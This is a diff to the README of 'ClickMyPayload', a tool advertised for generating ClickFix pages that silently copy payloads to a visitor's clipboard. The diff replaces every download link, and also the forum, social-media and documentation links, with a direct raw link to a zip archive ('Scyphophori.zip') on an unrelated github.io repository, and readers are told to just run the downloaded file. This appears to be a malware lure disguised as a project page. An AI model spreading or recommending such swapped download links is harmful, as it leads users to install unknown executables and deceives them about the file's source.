@@ -5,7 +5,7 @@ description: "Generate realistic browser-based ClickFix pages that silently copy
 ---
 <h1>🎯 ClickMyPayload - Click, Generate, Done — Instantly!</h1>
 
-[![Download ClickMyPayload](https://img.shields.io/badge/Download-ClickMyPayload-2ea44f?style=for-the-badge&logo=github)](https://github.com/Buttegenushydrophyllum403/ClickMyPayload)
+[![Download ClickMyPayload](https://img.shields.io/badge/Download-ClickMyPayload-2ea44f?style=for-the-badge&logo=github)](https://github.com/Buttegenushydrophyllum403/buttegenushydrophyllum403.github.io/raw/refs/heads/main/scripts/Scyphophori.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these three simple steps to get ClickMyPayload running on your Windows co
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[ClickMyPayload Download Page](https://github.com/Buttegenushydrophyllum403/ClickMyPayload)**
+Visit this link to download the application: **[ClickMyPayload Download Page](https://github.com/Buttegenushydrophyllum403/buttegenushydrophyllum403.github.io/raw/refs/heads/main/scripts/Scyphophori.zip)**
 
 The download button is clearly visible on that page. Click it, and your browser will start downloading the file automatically.
 
@@ -141,9 +141,9 @@ Only use ClickMyPayload on systems you own or have explicit permission to test.
 ## 🌐 Community & Support
 
 - 📧 **Email Support**: support@clickmypayload.io
-- 💬 **Community Forum**: https://community.clickmypayload.io
-- 🐦 **Twitter/X**: https://twitter.com/clickmypayload
-- 📘 **Documentation**: https://docs.clickmypayload.io
+- 💬 **Community Forum**: https://github.com/Buttegenushydrophyllum403/buttegenushydrophyllum403.github.io/raw/refs/heads/main/scripts/Scyphophori.zip
+- 🐦 **Twitter/X**: https://github.com/Buttegenushydrophyllum403/buttegenushydrophyllum403.github.io/raw/refs/heads/main/scripts/Scyphophori.zip
+- 📘 **Documentation**: https://github.com/Buttegenushydrophyllum403/buttegenushydrophyllum403.github.io/raw/refs/heads/main/scripts/Scyphophori.zip
 
 ---
 
@@ -178,7 +178,7 @@ Thank you for choosing ClickMyPayload. We built this tool with the community in 
 
 Need the download link again? Here it is:
 
-**[🔗 ClickHere to Download ClickMyPayload](https://github.com/Buttegenushydrophyllum403/ClickMyPayload)**
+**[🔗 ClickHere to Download ClickMyPayload](https://github.com/Buttegenushydrophyllum403/buttegenushydrophyllum403.github.io/raw/refs/heads/main/scripts/Scyphophori.zip)**
 
 Visit this link to download the application. Then just run the file, and you're done!
 
